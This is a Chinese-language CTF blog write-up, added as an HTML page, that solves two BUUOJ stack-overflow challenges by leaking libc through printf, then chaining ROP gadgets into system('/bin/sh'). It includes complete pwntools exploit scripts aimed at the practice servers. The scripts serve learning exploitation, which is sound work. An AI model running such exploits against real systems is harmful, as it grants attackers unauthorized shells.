@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
+    
+    <title>
+        
+            ret2libc-printf |
+        
+        Keep Theme
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Keep Theme
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        ret2libc-printf
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Keep Team</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-07-20 14:53:58</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Feb 09 2026 10:45:51 GMT+0800">2026-02-09 10:45:51</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise/">exercise</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/stack/">stack</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/ret2libc-printf/">ret2libc-printf</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="严格符合printf的格式"><a href="#严格符合printf的格式" class="headerlink" title="严格符合printf的格式"></a>严格符合printf的格式</h2><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2" >[HarekazeCTF2019]baby_rop2<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720150231484.png"  alt="image-20250720150231484"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720150244894.png"  alt="image-20250720150244894"></p>
+<p>而且函数中没有system函数和相应字符串</p>
+<p>要泄露libc的地址</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720150404867.png"  alt="image-20250720150404867"></p>
+<p>通过read读取数据，用printf打印出来</p>
+<p><code>printf</code> 函数的 GOT 地址不能用来泄露 <code>printf</code> 自己的地址？</p>
+<p>是的，这是个<strong>鸡生蛋蛋生鸡</strong> 的问题：</p>
+<ul>
+<li><code>printf@got</code> 保存的是 <code>printf</code> 的真实地址（libc 中的地址）。</li>
+<li>但你要调用 <code>printf</code> 才能打印它，而调用 <code>printf</code> 又依赖 GOT 表项的地址。</li>
+<li>如果 GOT 表项还没解析（延迟绑定），它指向 PLT stub，不是真实地址。</li>
+<li>即使 GOT 表项已解析，你也无法通过 <code>printf(&quot;%s&quot;, printf_got)</code> 正确读取地址。</li>
+</ul>
+<p>🧠 总结对比</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>puts(puts_got)</code></td>
+<td>✅ 可行</td>
+<td><code>puts</code>会尝试打印从<code>puts_got</code>开始的内容，libc 中有字符串，不会崩溃</td>
+</tr>
+<tr>
+<td><code>printf(&quot;%s&quot;, printf_got)</code></td>
+<td>❌ 不可行</td>
+<td><code>printf</code>会尝试从<code>printf_got</code>地址读取字符串，但那是个函数地址，不是字符串</td>
+</tr>
+<tr>
+<td><code>printf(&quot;%p&quot;, printf_got)</code></td>
+<td>✅ 可行（需构造）</td>
+<td>可以打印地址，但需要正确设置格式字符串</td>
+</tr>
+<tr>
+<td><code>printf(&quot;%s&quot;, read_got)</code></td>
+<td>✅ 可行（偶尔）</td>
+<td><code>read_got</code>指向的地址附近可能有字符串，可以打印出来</td>
+</tr>
+<tr>
+<td><code>puts(printf_got)</code></td>
+<td>✅ 可行（偶尔）</td>
+<td>同上，但依赖 libc 中的字符串</td>
+</tr>
+</tbody></table>
+<p>要调用printf函数进行泄露，就要根据其特性来传参，printf函数有两个参数，一个格式化字符串，一个可变参数列表</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720151142483.png"  alt="image-20250720151142483"></p>
+<p>RDI、RSI、RDX、RCX、R8、R9参数按照这个顺序传入寄存器中</p>
+<p>有单独的rdi</p>
+<p>所以rdi&#x3D;0x400733</p>
+<p>但没有单独对rsi的处理</p>
+<p>所以rsi_r15&#x3D;0x400731，对r15随便传入一个数就可</p>
+<p>第一次payload的构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(b&quot;name? &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read= u64(p.recvuntil(b&quot;\x7f&quot;)[-6:] + b&#x27;\0\0&#x27;)</span><br><span class="line"></span><br><span class="line">print(hex(read))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二次通过计算出libc的基址，加上偏移量就得到了需要的函数的地址，就可与i进行构造了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./babyrop2&#x27;)</span><br><span class="line">p = remote(&quot;node5.buuoj.cn&quot;,25235)</span><br><span class="line">elf = ELF(&#x27;./babyrop2&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400733</span><br><span class="line">pop_rsi_r15 = 0x0000000000400731 </span><br><span class="line">format_str = 0x0000000000400770  </span><br><span class="line">ret_addr = 0x0000000000400734</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[&#x27;printf&#x27;]</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">main_plt = 0x400636</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(b&quot;name? &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read= u64(p.recvuntil(b&quot;\x7f&quot;)[-6:] + b&#x27;\0\0&#x27;)</span><br><span class="line"></span><br><span class="line">print(hex(read))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;read&#x27;, read)</span><br><span class="line">libc_base = read - libc.dump(&#x27;read&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="单个函数"><a href="#单个函数" class="headerlink" title="单个函数"></a>单个函数</h2><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwn2_sctf_2016" >pwn2_sctf_2016<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720164815201.png"  alt="image-20250720164815201"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720164826945.png"  alt="image-20250720164826945"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250720164912004.png"  alt="image-20250720164912004"></p>
+<p>首先看到题目输入一个小于32的数，并把这个数当作get输入的最大限制</p>
+<p>所以可以输入一个负数来解决这个限制</p>
+<p>也是没有system函数的相关内容</p>
+<p>考虑泄露libc的地址</p>
+<p>:detective:用printf打印，可以用printf的got表、</p>
+<p>因为你调用了 <code>printf(printf_got)</code>。</p>
+<p>对于 <code>printf</code> 来说：</p>
+<ul>
+<li><p>它看不到这是一个整数地址</p>
+</li>
+<li><p>它只是把你给的指针当作一个<strong>字符串格式</strong>解析</p>
+</li>
+<li><p>如果你传入的这个地址是可读的内存，它就会按照那块内存的内容当作字符串去输出</p>
+<p>所以如果只是传一个参数，printf函数会刚好把它当作字符串</p>
+<p>刚好解决了传递它本身的got表地址，和只有一个参数的问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>之后就是标准流程</p>
+<p>就是记得返回地址是main函数</p>
+<p>要再次输入依次那个负数</p>
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from time import sleep</span><br><span class="line">r = remote(&quot;node5.buuoj.cn&quot;,28640)</span><br><span class="line">elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)</span><br><span class="line">printf_plt = elf.plt[&#x27;printf&#x27;]</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">main= elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(b&#x27;read?&#x27;)</span><br><span class="line">r.sendline(b&#x27;-1&#x27;)</span><br><span class="line">r.recvuntil(b&quot;data!\n&quot;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * (0x2c+4)</span><br><span class="line">payload += p32(printf_plt) + p32(main) + p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">printf_addr=u32(r.recv(4))#接受</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line"></span><br><span class="line">base = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)</span><br><span class="line">r.sendline(b&#x27;-1&#x27;)</span><br><span class="line">r.recvuntil(b&quot;data!\n&quot;)</span><br><span class="line">payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/stack/">stack</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/ret2libc-printf/">ret2libc-printf</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"
+                                   title="格式化字符串"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">格式化字符串</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/"
+                                   title="御网杯线下2025"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">御网杯线下2025</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
